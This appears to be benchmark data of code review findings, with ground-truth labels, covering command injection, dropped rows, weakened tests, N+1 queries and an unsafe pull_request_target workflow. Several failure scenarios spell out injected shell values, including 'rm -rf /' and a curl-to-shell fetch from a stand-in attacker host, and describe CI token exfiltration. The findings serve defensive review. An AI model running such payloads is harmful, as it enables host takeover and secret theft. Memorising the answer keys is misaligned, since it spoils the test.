findings.body: The spec requires that report commands use an argument vector without a shell. This change does the opposite: it builds a command string and passes it to subprocess.run with shell=True. Besides contradicting the explicit requirement, this introduces a command injection vulnerability — user_name is interpolated directly into a shell command, so a value containing shell metacharacters (e.g. '; rm -rf /' or '$(...)') would be executed. The original code already used an argument vector; this change regresses it.
findings.failure_scenario: A user supplies a user_name containing shell metacharacters; the shell interprets them and executes arbitrary commands on the host running the report, leading to command injection.
findings.title: Use argument vector, not shell=True, to run the report command

findings.body: The spec requires that rendering preserve every input row in order. Returning rows[1:] silently discards the first row, so the function no longer preserves all input rows. The previous implementation returned rows unchanged, which satisfied the requirement; this change breaks it.
findings.failure_scenario: Calling render_report("alice", ["first", "second"]) returns ["second"], losing "first" from the output and violating the contract that all rows be preserved in order.
findings.title: Return rows[1:] drops the first input row, violating row preservation

findings.body: The new assertion only verifies that render_report returns a non-None value. It would pass even if the function returned an empty list, a list of the wrong rows, or a string, so it no longer guards against regressions in the output content. The previous test asserted the exact expected output and gave real protection; keep that or strengthen the check to match the function's current contract. If the contract has deliberately changed (e.g., it now transforms the rows), assert against the expected transformed value rather than merely checking non-None.
findings.title: Restore a content-checking assertion in the render_report test

findings.body: The change replaces a single repository.load_many(item_ids) call with a loop that calls repository.load(item_id) once per id. If load() performs a database query or network request, this turns one batched operation into N round-trips, so the cost scales linearly with the number of ids. The previous load_many API already existed and was the batched form; the new code regresses to N+1 behavior. If load() is cheap or cached this is a non-issue, but the diff itself shows the batched call being replaced by a per-item call, so the regression is real on its face.
findings.failure_scenario: When item_ids is large, each iteration issues its own repository.load() query, multiplying latency and database load compared to the single load_many() call it replaced.
findings.suggestion: return [item for item in repository.load_many(item_ids) if item.active and item.owner is not None and item.owner.enabled]
findings.title: Batch the item lookups instead of one load per id

findings.body: datetime.utcnow() returns a timezone-naive datetime and is deprecated since Python 3.12; it may also be removed in newer runtimes. The original code stored an aware UTC datetime via datetime.now(UTC), so consumers that compare or combine fetched_at with aware datetimes will fail once they receive a naive value. Replace the call with a UTC-aware equivalent, e.g. import UTC and use datetime.now(UTC), or import timezone and use datetime.now(timezone.utc).
findings.failure_scenario: A consumer compares fetched_at to datetime.now(timezone.utc); the naive/aware comparison raises TypeError. On a runtime where utcnow has been removed, fetching a user raises AttributeError.
findings.title: Use timezone-aware UTC now instead of datetime.utcnow()

findings.anchor: def fetch_user(user_id: str, timeout: int) -> tuple[dict[str, object], int]:
findings.body: The commit message states the refactor keeps fetch_user backward compatible, but this line removes the 30-second default for timeout and changes the return type from dict to tuple. Existing callers that pass only a user_id now raise TypeError because timeout is required, and callers expecting a dict payload receive a tuple instead. The payload also no longer includes a timeout key. This is the opposite of the stated intent. To fix it, restore the default value and keep the original dict return, updating only the internals if a change is truly needed.
findings.failure_scenario: An existing caller such as fetch_user('someone') raises TypeError because timeout is required; a caller that does result = fetch_user('someone', 10) and then reads result['fetched_at'] breaks with TypeError because result is now a tuple.
findings.title: Preserve the original signature and return contract for backward compatibility

findings.body: PurePath(user_id).name silently rewrites the lookup key: any user_id containing a path separator is truncated to its basename, so the query returns the record for a different id than the caller requested. The original query was already parameterized, so there is no SQL-injection vector here to defend against; the id is a database value, not a filesystem path. The behavior is also platform-dependent — PurePath uses the host OS's separator semantics, so on Windows a backslash is a separator while on POSIX it is not, meaning the same input yields different results on different platforms. Edge inputs like "." or "/" normalize to the empty string, which can match an unrelated record with an empty id. If the intent is to guard against path-like ids, validate the id format explicitly instead of silently mutating it.
findings.failure_scenario: A caller passes user_id "alice/42" (or "alice\\42" on Windows); PurePath(...).name returns "42", and the query fetches the record for id "42" instead of "alice/42", silently exposing the wrong user's data.
findings.title: Do not path-normalize the user_id lookup key

findings.body: The test was changed from asserting the exact output (toEqual) to only checking that the result is defined (toBeDefined). This weakens the test's ability to catch regressions. Combined with the change to rows.slice(1) in report.ts, the test no longer verifies that the function preserves the rows. The test should assert the exact expected output to protect the function's contract.
findings.failure_scenario: A future change that corrupts the output (e.g. dropping rows, reordering, or returning wrong data) will still pass the test because toBeDefined only checks for a non-null/undefined value.
findings.title: Weakened test assertion hides regression

findings.body: The change from spawnSync with an argument array to execSync with a shell command string introduces a command injection vulnerability. The userName parameter is interpolated directly into the command string without any escaping or validation. If userName is derived from user input, an attacker can inject arbitrary shell commands that execute with the privileges of the Node.js process. The original spawnSync call passed arguments as an array, which safely avoided shell interpretation. The new code also does not capture or handle the command output, but the primary concern is the injection risk.
findings.failure_scenario: An attacker controls the userName parameter (e.g., via an HTTP request or CLI argument). They provide a value like 'alice; rm -rf /' which is executed by the shell, leading to arbitrary command execution on the server.
findings.suggestion:
const result = spawnSync("report", ["--user", userName], { stdio: "pipe" });
  return result.stdout.toString().split("\n");
findings.title: Command injection via userName in execSync

findings.body: The change replaces spawnSync (which passes arguments as an array, avoiding shell interpretation) with execSync, which runs the command through a shell. The userName value is interpolated directly into the command string. If userName contains shell metacharacters (e.g. `; rm -rf /` or `$(...)`), they will be executed by the shell. This is a command injection vulnerability. Even if userName is currently trusted, this is a dangerous pattern. Use spawnSync with an argument array instead, or at minimum validate/sanitize userName.
findings.failure_scenario: If userName is attacker-controlled or contains shell metacharacters, the shell executes arbitrary commands, leading to code execution or data loss.
findings.title: Use execSync with shell interpolation — command injection risk

findings.body: The change returns rows.slice(1) instead of rows. This drops the first element of the input array. The test was changed from asserting equality to only checking that the result is defined, which masks this regression. The function's contract (and the PR's stated intent to 'preserve report behavior') implies the rows should be returned unchanged. Unless there is a deliberate reason to drop the first row, this is an off-by-one error.
findings.failure_scenario: Callers passing ['first', 'second'] now receive ['second'], losing the first row. The weakened test assertion hides the regression.
findings.title: Returning rows.slice(1) drops the first row — off-by-one

findings.body: The change replaces a single repo.loadMany(ids) call with a loop that awaits repo.load(id) once per id. If repo.load performs a database query or network request per call, this introduces an N+1 query pattern where the previous code batched the work. The cost now scales linearly with the number of ids, and each iteration adds a round-trip. The original loadMany(ids) already existed and presumably handled batching; the new loop discards that benefit. If loadMany cannot be used because filtering must happen per item, consider loading all items in one call and then filtering in memory, or at least document why per-item loading is required.
findings.failure_scenario: When ids contains many entries, the function issues one database or network round-trip per id instead of one batched call, increasing latency and potentially exhausting connection pools or rate limits as the input size grows.
findings.suggestion:
const items = await repo.loadMany(ids);
  return items.filter((item) => item.active && item.owner && item.owner.enabled);
findings.title: Batch the per-id loads into a single loadMany call

findings.body: The function previously returned every item loaded for the given ids. It now silently drops items that are inactive, have no owner, or whose owner is disabled. The stated intent ('plant typescript-efficiency-design-v1') does not mention any filtering, so this is an out-of-scope change to the function's contract that can break callers expecting one result per id.
findings.failure_scenario: A caller that previously received every item for the given ids now receives a subset; if it expects one result per id (e.g., to map or count), it will silently get fewer entries and produce wrong downstream results.
findings.title: Filtering results is an unexplained behavior change

findings.body: The change lowercases the user ID before querying, which assumes every stored ID is already lowercase. If the database stores IDs case-sensitively (typical for primary keys), any ID containing uppercase characters will no longer match, silently returning no row where the original query would have found the user. The commit message ('plant typescript-clean-context-v1') gives no indication that case-insensitive lookup is intended, so this is an unexplained behavior change. If case-insensitive matching is genuinely desired, it should be applied consistently on the stored side (e.g. a case-insensitive column/collation) rather than only to the input, otherwise lookups and any other code paths that use the raw ID will disagree.
findings.failure_scenario: A user with ID 'AbC123' exists in the database. findUser is called with 'AbC123'; the query runs with 'abc123' and returns no row, so the caller sees the user as not found even though the ID is valid.
findings.title: Lowercasing the ID changes lookup semantics

ground_truth.clean_trap: Normalized user input still reaches SQL, but it remains a bound parameter rather than query text.

findings.body: renderReport now builds a shell command string by interpolating userName and passes it to execSync. execSync runs through the shell, so shell metacharacters in userName are interpreted as new commands rather than data. This is a regression from the previous spawnSync("report", ["--user", userName]) usage, which did not invoke a shell. Use execFileSync (or spawnSync) with an arguments array, and update line 1 to import execFileSync instead of execSync. Remove the now-unused `const command` line; otherwise it remains as dead code.
findings.failure_scenario: If userName is user-controlled and is set to something like `alice; curl evil.example.com/x | sh`, the shell executes the injected command with the privileges of the process running the report, leading to arbitrary command execution on the host.
findings.title: Use an args-array child process API to prevent command injection

findings.body: The change replaces spawnSync with execSync and builds the command as a shell string. execSync runs the command through a shell, so userName is interpolated into the shell command. If userName contains shell metacharacters (e.g. `; rm -rf /` or `$(...)`), they are executed. The previous spawnSync form passed arguments as an array and did not invoke a shell, so it was safe. This is a regression in security posture introduced by the change.
findings.failure_scenario: A caller passes userName = "alice; touch /tmp/pwned". execSync executes `report --user alice; touch /tmp/pwned`, running the injected command on the host.
findings.title: Use spawnSync with argument array to avoid shell injection

findings.body: The change introduces a new code path: invoking the report command via execSync and returning rows.slice(1). If report.test.js does not already cover this, the new behavior (dropping the first row, and the execSync invocation) ships untested. Verify coverage in report.test.js; if absent, add a test that stubs execSync and asserts the first row is dropped.
findings.title: Add coverage for the new execSync path and header-row drop

findings.body: The test was changed from asserting the exact returned array to only checking truthiness. This removes the only verification that renderReport returns the expected rows. Combined with the rows.slice(1) change, the test now passes even though the function drops data. The test should assert the exact expected output to catch regressions.
findings.failure_scenario: If renderReport later returns null, undefined, or an empty array, the test still passes because those are falsy — but the test would also pass for any truthy wrong value, so the data-loss bug in rows.slice(1) goes undetected.
findings.title: Weakened test no longer verifies output

findings.body: The user-controlled `user` value is interpolated into a shell command string and executed via `sh -c`. Shell metacharacters in `user` (e.g. `;`, `$(...)`, backticks) are interpreted by the shell, enabling arbitrary command execution. The previous code passed `user` as a separate argument to `report`, which is safe. Replace the shell indirection with direct argument passing and remove the now-unused `command` variable.
findings.failure_scenario: If `user` is attacker-controlled, a value such as `alice; rm -rf /` causes the shell to execute `rm -rf /` after the report command, compromising the host.
findings.title: OS command injection via user input in shell command

findings.body: The user-controlled `user` value is interpolated into a shell command string passed to `sh -c`. Any shell metacharacters in `user` (spaces, `;`, `$()`, backticks) allow arbitrary command execution. The previous code used `Command::new("report").args(["--user", user])`, which passed the argument without a shell and was safe. The shell indirection is also needless complexity — the direct API is simpler and avoids the injection surface entirely.
findings.failure_scenario: When `user` is attacker-controlled (e.g. a username like `alice; rm -rf /`), the shell executes the injected command with the application's privileges, leading to arbitrary code execution.
findings.title: Use the safe Command API instead of shell interpolation

findings.body: The commit message says 'preserve report rows for named users', but the new code drops the first row via skip(1). The previous implementation returned all rows unchanged. If the first row is data, it is lost.
findings.failure_scenario: When render_report is called with rows, the first element is removed from the returned Vec, so callers receive fewer rows than provided.
findings.title: Preserve all rows instead of skipping the first

findings.body: The test was changed from asserting the exact returned rows to only checking the result is non-empty. This weakens coverage: a regression that drops or corrupts rows other than the first would go undetected. The change appears to accommodate the new `skip(1)` behavior rather than assert intended behavior. If dropping the first row is intentional, assert the exact expected output; otherwise the `skip(1)` is silently discarding data.
findings.title: Restore the exact assertion on returned rows

findings.body: The change replaces a single `repo.load_many(ids)` call with a loop that calls `repo.load(*id)` once per element. If `load` performs a database query or network request, this turns one batched operation into N round-trips, and the cost scales linearly with the number of ids. The original `load_many` API already exists and is the intended batched path; the new loop discards it. If `load` is cheap or in-memory this is a non-issue, but the diff gives no reason to abandon the batched API, so the regression is worth flagging.
findings.failure_scenario: When `ids` is large, each iteration issues its own repository call, multiplying latency and load on the backing store compared to the single `load_many` call the code previously made.
findings.title: Batch the repository loads instead of one call per id

findings.body: `VecFactory` is a single-use abstraction with no behavior beyond calling `Vec::new()`. It adds a type and an impl block for no benefit, and it is the only caller in the diff. The simpler path is to construct the Vec directly, which is clearer and removes needless code.
findings.title: Drop the VecFactory wrapper and use Vec::new directly

findings.body: The loop nests three levels of conditionals (`item.active`, then `item.owner`, then `owner.enabled`) before pushing. Guard clauses would flatten this and make the filtering intent clearer, at the cost of a slightly longer body. This is a readability/maintainability suggestion, not a correctness issue.
findings.title: Flatten the nested active/owner/enabled checks with guard clauses

findings.body: std::mem::uninitialized() is deprecated (since Rust 1.39) and creates a value of type UserRecord whose bits are uninitialized. Passing that value into UserRecord::merge(scratch, id) reads the uninitialized memory, which is undefined behavior in Rust. UB here can produce indeterminate values, stale stack/heap contents, or memory corruption, and the resulting UserRecord may carry attacker-influenced or leaked data. Construct a properly initialized UserRecord instead (e.g. via its constructor) or, if a truly uninitialized buffer is required, use MaybeUninit and only assume_init after every field is written. The fix is structural and depends on UserRecord's API, which is not visible in this diff, so no drop-in replacement is given.
findings.failure_scenario: Any call to fetch_user triggers the unsafe block; merge reads the uninitialized scratch, so the returned UserRecord contains indeterminate bytes. Depending on what was previously on the stack, this can leak sensitive data or corrupt downstream logic, and the behavior is not reproducible across builds.
findings.title: Remove std::mem::uninitialized() — reading uninitialized memory is undefined behavior

findings.body: The canonicalization and strip_prefix check establish that candidate is under the canonicalized root, but File::open(candidate) later resolves that path by name once more. The path is only guaranteed safe at the moment canonicalize() runs; between the canonicalize() call and File::open(), an attacker able to write to any directory component can replace the path (or the final file) with a symlink pointing outside root. That file will then be opened, defeating the containment check. Prefer an open anchored on an opened directory descriptor (e.g. openat()/O_NOFOLLOW on Unix, or verify with metadata of the opened descriptor) and confirm the opened file’s canonical path before exposing its contents.
findings.failure_scenario: A user can race by replacing the file named by candidate with a symlink to e.g. /etc/passwd after the canonical path has been verified but before File::open fires; the open follows the symlink and returns a file outside the allowed root, violating the sandbox boundary the code was intended to enforce.
findings.title: Open by path after canonicalization reintroduces a TOCTOU race

ground_truth.clean_trap: An untrusted name is joined to a root, but both paths are canonicalized and strip_prefix enforces containment before opening.
ground_truth.name: rust-clean-context-v1

findings.body: The `user` parameter is interpolated directly into a shell command string passed to `sh -c`. Unlike the previous `Process.run('report', ['--user', user])`, which passed the argument safely without a shell, this change allows shell metacharacters in `user` to be interpreted as commands. An attacker who controls `user` can execute arbitrary commands on the host. Replace the shell invocation with a direct argument-list call and remove the now-unused `command` variable.
findings.failure_scenario: If `user` contains a value such as `alice; rm -rf /`, the constructed command becomes `report --user alice; rm -rf /`, and `sh -c` executes the injected command with the privileges of the application.
findings.title: OS command injection via shell interpolation

findings.body: The change builds a shell command by interpolating `user` into a string and runs it via `sh -c`. If `user` contains shell metacharacters (e.g. `;`, `&&`, backticks), they are interpreted by the shell, allowing arbitrary command execution. The previous code passed `user` as a separate argument to `Process.run`, which is safe. Use `Process.run('report', ['--user', user])` or properly escape/validate the input.
findings.failure_scenario: A caller passes `user` as `alice; touch /tmp/pwned`; the shell executes `touch /tmp/pwned` after the report command.
findings.title: Avoid shell interpolation of user input

findings.body: The previous implementation used repository.loadMany(ids) to fetch all items in a single call. The new loop calls repository.load(id) once per id, turning a batched query into N+1 round-trips. This is a performance regression that scales linearly with the number of ids.

findings.title: Batch the item loads instead of one call per id

findings.body: The commit message says 'keep fetchUser callers compatible', but this change makes `timeoutMs` a required positional parameter (previously optional with default 30000) and changes the return type from `Map<String, Object?>` to a record `(Map<String, Object?>, int)`. Any caller that invoked `fetchUser(id)` or expected a map will fail to compile. The returned map also drops `timeoutMs` and `fetchedAt` and adds `origin`, further changing the contract.

findings.body: The change replaces the argument-list ProcessBuilder with a /bin/sh -c invocation that concatenates the user value directly into the command string. Any shell metacharacter in user (spaces, ;, |, $, backticks, etc.) is interpreted by the shell, allowing arbitrary command execution. The previous form passed user as a separate argument and was not subject to shell interpretation.
findings.failure_scenario: If user is an untrusted value such as "alice; rm -rf /", the shell executes report --user alice; rm -rf /, running the attacker's command with the service's privileges.
findings.title: Avoid shell command injection by using ProcessBuilder

findings.body: rows.subList(1, rows.size()) removes the first element from the result, contradicting the stated intent to preserve report rows. It also throws IndexOutOfBoundsException when rows is empty because subList requires fromIndex <= toIndex. The previous code returned rows unchanged.
findings.failure_scenario: When rows is empty, subList(1,0) throws IndexOutOfBoundsException; when rows has one or more elements, the first row is silently dropped, so callers receive an incomplete report.
findings.title: Return all rows instead of dropping the first and crashing on empty input

findings.body: The test was weakened from asserting the exact returned rows to only assertNotNull. The new code path `rows.subList(1, rows.size())` drops the first row, but the test no longer verifies that behavior — a regression in the subList logic (dropping the wrong row, an off-by-one, or an empty-list edge case) would pass the test silently. The test name was also changed from `preservesRows` to `returnsRows`, which is appropriate since rows are no longer preserved, but the assertion should still pin down the actual output.
findings.title: Restore assertion on returned rows to cover the new subList behavior

findings.body: The new loop immediately calls `item.active()` on the result of `repository.load(id)` without a null check. If the repository returns null for missing or inaccessible IDs, this path throws a NullPointerException, whereas the previous batch operation did not expose the per-item dereference. Unless other code guarantees that `load` never returns null, the item should be null-guarded before calling `active()`.
findings.failure_scenario: When `enrich` receives an ID that `repository.load` cannot resolve, `load` returns null, `item.active()` dereferences null, and the whole enrichment call crashes instead of returning the remaining items.
findings.title: Guard against a null item from Repository.load

findings.body: The previous implementation used repository.loadMany(ids) in a single call. The new loop calls repository.load(id) once per id, turning one batched operation into N round-trips. If load is a database or network call, latency and load scale linearly with the number of ids.
findings.failure_scenario: For a large ids list, each iteration issues a separate repository call, multiplying round-trips and potentially exhausting the connection pool or slowing the request proportionally to input size.
findings.title: Batch the per-id loads with loadMany

findings.anchor: Map.Entry<User, Integer> fetch(String id, int timeoutMs) {
findings.body: The change replaces the previous timeout-based constructor with a call to `new Date().toGMTString()`. `toGMTString()` is deprecated since Java 1.1 and uses the obsolete GMT timezone with US-ASCII formatting, which is locale-dependent and not ISO-8601 compliant. More importantly, the method signature changed from `fetch(String id, Integer timeoutMs)` to `fetch(String id, int timeoutMs)`, which breaks binary and source compatibility for existing callers who pass `null` to indicate a default timeout. The commit message claims 'preserve UserClient caller compatibility', but changing `Integer` to `int` removes the ability to pass `null` and changes the return type from `User` to `Map.Entry<User, Integer>`, which is a breaking API change for all existing callers.
findings.failure_scenario: An existing caller that invokes `fetch(id, null)` to use the default timeout will fail to compile because `int` cannot accept `null`. A caller that expects a `User` return value will break because the method now returns `Map.Entry<User, Integer>`. Additionally, `toGMTString()` produces a non-standard date string that may not be parseable by downstream consumers expecting ISO-8601 or locale-aware formats.
findings.title: Use Locale-aware date formatting instead of deprecated toGMTString

findings.anchor: var user = new User(id, new Date().toGMTString());
findings.body: toGMTString() has been deprecated since Java 1.1. It produces a non-standard, locale-dependent string representation and may be removed in a future JDK. Prefer java.time formatting (e.g. DateTimeFormatter with UTC) or SimpleDateFormat with GMT and Locale.US, matching whatever format the User constructor expects.
findings.failure_scenario: A future JDK removes toGMTString(), breaking compilation; meanwhile the produced string is not ISO-8601 and can vary, so any consumer parsing it is fragile.
findings.title: Replace deprecated Date.toGMTString()

findings.body: The method returns a Map.Entry solely to pair the User with the timeoutMs argument. Since timeoutMs is returned unchanged, callers already have that value; the pair adds no information and forces callers to unpack a Map.Entry, which is semantically a map entry, not a result object. Return User directly (and drop the timeoutMs parameter if it is not used elsewhere).
findings.title: Return User directly instead of a Map.Entry pair

findings.body: The new fetch() method references Map.Entry and Map.entry, but the only import added is java.util.Date. This hunk shows the entire top of the file (line 1 is the first line of the file and the old file had no imports at all), so no java.util.Map import exists anywhere in the file. Map does not resolve and the class fails to compile.
findings.failure_scenario: Building the project fails with 'cannot find symbol: Map' at the fetch() method, so the change cannot ship at all.
findings.title: Add the missing java.util.Map import — the file will not compile

findings.anchor: var statement = db.prepareStatement("SELECT * FROM users WHERE id = ?");
findings.body: The PreparedStatement is never closed. In a long-running application or under load, each call to find() leaks a database cursor and associated server-side resources until the connection is closed or garbage collected. Use try-with-resources to guarantee cleanup.
findings.failure_scenario: Repeated calls to find() exhaust the database connection pool or hit the database's max open cursors limit, causing subsequent queries to fail with 'ORA-01000: maximum open cursors exceeded' or similar.
findings.title: Close PreparedStatement to avoid resource leak

findings.body: String.toLowerCase() without an explicit Locale uses the JVM default locale. In locales like Turkish, 'I' lowercases to 'ı' (dotless i) rather than 'i', so the query may not match the stored ID. Use Locale.ROOT (or Locale.ENGLISH) for consistent, locale-independent case-folding.
findings.failure_scenario: On a JVM running with a Turkish default locale, a user ID containing 'I' is lowercased to 'ı', so the prepared statement looks up 'ı' and returns no rows even though the stored ID is 'i'.
findings.title: Use Locale.ROOT for case-folding user ID

findings.body: The change replaces the argument-array form of exec.Command with `sh -c "report --user "+user`, interpolating the user-controlled value directly into a shell command line. This both violates the spec requirement that user names be passed as arguments without a shell, and introduces a command-injection vulnerability: any shell metacharacters in `user` (e.g. `;`, `$()`, backticks) are executed by the shell. The original code passed the user as a separate argument, which was safe.
findings.failure_scenario: A caller passes a user string such as `alice; rm -rf /` — the shell interprets the injected command and executes it with the process's privileges, leading to arbitrary command execution.
findings.title: Shell injection: user input concatenated into sh -c

findings.body: The change returns `rows[1:]` instead of `rows`. This drops the first element of the input slice, which contradicts the commit message 'preserve report rows for named users' — the rows are not preserved, they are truncated. Additionally, if `rows` is empty, `rows[1:]` panics with an index out of range error. The original code returned the rows unchanged.

findings.title: Returning rows[1:] drops the first row and panics on empty input

The original test caught the regression introduced by `rows[1:]`.

findings.anchor: func FetchUser(id string, timeout time.Duration) (User, time.Duration) {
findings.body: The commit message claims 'preserve FetchUser caller compatibility', but the signature is changed in two breaking ways: the parameter `timeout` goes from `*time.Duration` to `time.Duration`, and the return type goes from a single `User` to `(User, time.Duration)`. Every existing caller that passes a pointer or expects a single return value will fail to compile. This is the opposite of the stated intent.
findings.failure_scenario: Any existing caller invoking `FetchUser(id, &timeout)` or assigning `u := FetchUser(...)` fails to compile after this change, breaking the build for all consumers of the package.
findings.title: Signature change breaks callers, contradicting stated intent

findings.body: ioutil.ReadFile("defaults.json") is called and its error is explicitly discarded. If the file does not exist or cannot be read, the error is silently swallowed. While the result is unused, this pattern hides real filesystem problems and makes the code harder to debug. If the read is intentional, the error should be handled or the call removed entirely.
findings.failure_scenario: When defaults.json is missing or unreadable, the error is discarded and the function still returns normally, hiding the failure from callers and making the root cause difficult to diagnose.
findings.title: Unchecked file read may fail silently and mask errors

findings.body: FetchUser now returns the timeout argument unchanged, so the second return value carries no information the caller doesn't already have. The file read is discarded, so the timeout is never modified. Simplify the signature to return only User and remove the timeout parameter if it is not used elsewhere.
findings.failure_scenario: Callers must handle a second return value that is always identical to the argument they passed, adding API surface and noise without benefit.
findings.title: Drop the redundant timeout return value

expected.label: required timeout and second return break compatibility

findings.body: This change switches the workflow to `pull_request_target`, which executes in the base repository's context with access to repository secrets, and then checks out the PR head SHA (`ref: ${{ github.event.pull_request.head.sha }}`) before running `npm test` with `RELEASE_TOKEN` in the environment. Because the checked-out code and any install/test scripts it triggers are attacker-controlled, a malicious PR can exfiltrate `RELEASE_TOKEN` (e.g., via a `prepare` script or a test that curls the env var to an attacker server). This is a well-known GitHub Actions anti-pattern that turns any PR into a remote code execution primitive against the repository's secrets.
findings.failure_scenario: An attacker opens a PR containing a malicious `package.json` `prepare` script or test that reads `process.env.RELEASE_TOKEN` and sends it to an external endpoint. The workflow runs on `pull_request_target`, so it has the secret, and the attacker's code executes in the base repo context, leaking the token.
findings.title: Do not run untrusted PR code with secrets via pull_request_target

findings.body: Even setting aside the `pull_request_target` trigger, exposing `RELEASE_TOKEN` as an environment variable to `npm test` means any code executed during the test/install phase can read it. The commit message 'plant github-actions-security-v1' suggests this is a deliberate security plant. The token should never be made available to code that runs on untrusted PR content. If the token is needed for a legitimate purpose, it should be scoped down (least privilege) and only used in a trusted context, never with PR-controlled code.
findings.failure_scenario: A PR author crafts a test or install hook that exfiltrates `RELEASE_TOKEN`; because the token is in the environment of the test step, it is captured and sent to an attacker-controlled server, compromising the repository's release pipeline.
findings.title: Remove exposure of RELEASE_TOKEN to untrusted test code

expected.label: pull_request_target executes untrusted head with a secret

findings.body: The action is referenced by a mutable major-version tag (v6). A tag can be moved to a different commit without notice, so the code that runs is not the code that was reviewed. Because this workflow now runs on pull_request_target with write access to pull-requests, a compromised or malicious update to the tag would execute with those permissions. Pin the action to a specific commit SHA to make the supply chain auditable and immutable.
findings.failure_scenario: If the v6 tag is retargeted to a malicious commit, the next workflow run executes that code with pull-requests: write, allowing an attacker to modify PRs or exfiltrate data from the repository context.
findings.title: Pin actions/labeler to a full commit SHA

ground_truth.clean_trap: pull_request_target is intentional for labeling; checkout stays on the trusted base revision and no secret is exposed to fork code.

An attacker-controlled user_name containing shell metacharacters (e.g., '; rm -rf /' or '$(...)') will be interpreted by the shell, allowing arbitrary command execution in the reviewer process. Prefer passing a list of arguments without shell=True, which avoids shell interpretation entirely.

findings.body: The rewritten test only asserts `is not None`. Since `render_report` always returns a list (or raises), this assertion is effectively vacuous: it passes regardless of whether the function returns the first row, the last row, the whole list, or an empty list. The behavior of the change under test — `return rows[1:]` now drops the first element — is not verified at all, so the primary effect of the commit is a regression in test coverage at the exact moment the implementation's return behavior changed. The previous test at least pinned the exact output; the new one pins nothing.
findings.failure_scenario: A later edit changes `return rows[1:]` to `return rows` or `return rows[:]`; the assertion `is not None` still passes, so the regression in what `render_report` returns ships to CI and production undetected.
findings.title: Restore direct assertions to test the new return-row behavior

findings.body: The new loop calls repository.load(item_id) and immediately accesses item.active without checking whether the repository may return None for a missing or invalid item_id. If load returns None for any item, this raises AttributeError and aborts the entire enrichment, whereas the previous load_many call may have tolerated missing items or returned them for filtering. If the repository contract guarantees non-None returns, this is not an issue, but the diff does not show that guarantee.
findings.failure_scenario: When repository.load returns None for an item_id (e.g., a deleted record), the code raises AttributeError: 'NoneType' object has no attribute 'active', crashing the enrichment instead of skipping the item.
findings.suggestion:
item = repository.load(item_id)
        if item is not None and item.active:

findings.body: The change wraps user_id in PurePath and uses .name to strip any directory components. This is a security-relevant transformation: it silently alters the lookup key. If user_id is a plain identifier like 'alice', PurePath('alice').name returns 'alice' unchanged, so normal lookups still work. But if user_id contains a path separator (e.g. 'admin/../../etc/passwd' or 'users/42'), the .name attribute returns only the final component after the last separator. This means a caller passing a value with a slash will get a different record than the one they asked for — the lookup silently resolves to a different user. The change is also unexplained by the stated intent ('plant python-clean-context-v1'), which gives no reason to alter the query key. If the goal was to prevent path traversal in a file path, applying it to a database identifier is the wrong layer and changes semantics. If the goal was to sanitize input, the transformation is lossy and surprising. Either way, the behavior change is not justified by the intent and can cause wrong-user lookups.
findings.failure_scenario: A caller passes user_id='admin/../bob'. PurePath('admin/../bob').name returns 'bob', so the query looks up 'bob' instead of the requested 'admin/../bob' — the function returns the wrong user's record without any error.
findings.title: Normalize user_id with PurePath before SQL lookup

findings.body: The previous code passed `userName` to `spawnSync` as a separate argv element, so it was never interpreted by a shell. Now `execSync` builds a shell string with the raw `userName` interpolated, so any shell metacharacters in the input (`;`, `&&`, `|`, backticks, `$(...)`, etc.) are executed. `renderReport` takes `userName` directly, and if any caller passes untrusted input this is a classic OS command injection (CWE-78). Additionally `execSync` runs with no timeout, so a long-running or injected command blocks the process indefinitely.
findings.failure_scenario: When userName contains e.g. `alice; curl evil.example | sh`, execSync hands the entire string to the shell, which executes curl (or any injected command) with the privileges of the Node process in addition to the intended report binary.
findings.title: Fix OS command injection in renderReport by not using a shell

findings.body: The change from spawnSync (which never invokes a shell) to execSync with string interpolation runs the command through a shell. userName is interpolated directly into the command string, so shell metacharacters in userName (e.g. `;`, `&&`, `$()`, backticks) allow arbitrary command execution. The previous spawnSync call passed arguments as an array and was not vulnerable. Add execFileSync to the import from "node:child_process" and pass arguments as an array to avoid the shell entirely.
findings.failure_scenario: If userName is attacker-controlled (e.g. "alice; rm -rf /"), the shell interprets the injected command and executes it with the process's privileges, leading to arbitrary code execution.
findings.title: Use execFileSync to avoid shell injection

findings.body: execSync runs the command through a shell, so userName is interpolated into a shell command line. A userName containing shell metacharacters (e.g. `; rm -rf /`) can execute arbitrary commands. The previous spawnSync call with an argument array avoided the shell. Use spawnSync("report", ["--user", userName]) or execFileSync with an argument array, and remove the command string.
findings.failure_scenario: If userName is attacker-controlled and contains shell metacharacters, the injected command executes with the privileges of the Node process.
findings.title: Avoid shell injection by using spawnSync/execFileSync

findings.body: The test was weakened from toEqual(["first", "second"]) to toBeTruthy(), which passes for any truthy value, including an empty array. This no longer verifies that renderReport returns the expected rows, and it hides the behavior change in report.js where the function now returns rows.slice(1), dropping the first row. If dropping the first row is intended (e.g. to remove a header), the test should assert the exact expected output; otherwise the change is a regression.
findings.failure_scenario: If renderReport accidentally returns an empty array or wrong data, the test still passes, allowing the regression to ship.
findings.title: Restore assertion on returned rows

findings.body: userName is interpolated into a shell command string passed to execSync, so any shell metacharacters in the user name are executed by the shell. The previous spawnSync call with an argument array was safe. Revert to spawnSync (or execFileSync) with an argument array and update the import on line 1 to `import { spawnSync } from "node:child_process";`; the `command` variable on line 4 should then be removed.
findings.failure_scenario: A caller passes userName like `alice; touch /tmp/pwned`; execSync runs `report --user alice; touch /tmp/pwned`, executing the injected command on the host.
findings.title: Replace shell interpolation with spawnSync to prevent command injection

findings.body: The spec requires that rendering preserve every input row. `rows.slice(1)` discards the first row, so the function no longer returns all rows. Return `rows` unchanged.
findings.failure_scenario: renderReport("alice", ["first", "second"]) returns ["second"], silently dropping the first row from the report.
findings.title: Preserve every input row: do not drop the first row

findings.body: The previous implementation used repository.loadMany(ids) to fetch all items in one call. The new loop calls repository.load(id) once per id, issuing one database round-trip per element. This is an N+1 regression: latency and load grow linearly with the number of ids, and it can exhaust connection pools for large inputs. Use loadMany and filter the results instead.
findings.failure_scenario: When ids contains many entries, enrich() performs one repository.load() query per id instead of a single loadMany() call, multiplying database round-trips and increasing latency proportionally to the input size.

findings.body: The query uses `id = ?`, which is an exact, case-sensitive comparison under most collations. Lowercasing only the input paramet er changes the searched value; it does not make the column comparison case-insensitive. If stored IDs keep their original case or the column uses a case-sensitive collation, any ID containing uppercase letters will no longer match, and the query returns no row. If case-insensitive lookup is intended, apply LOWER() to the stored column as well, or normalize IDs at write time so both sides are consistently lowercased.
findings.failure_scenario: A user whose id is 'Abc123' calls findUser(db, 'abc123'). The query searches for 'abc123' exactly; under a case-sensitive collation, 'Abc123' is not equal to 'abc123', so the correct user is never returned.
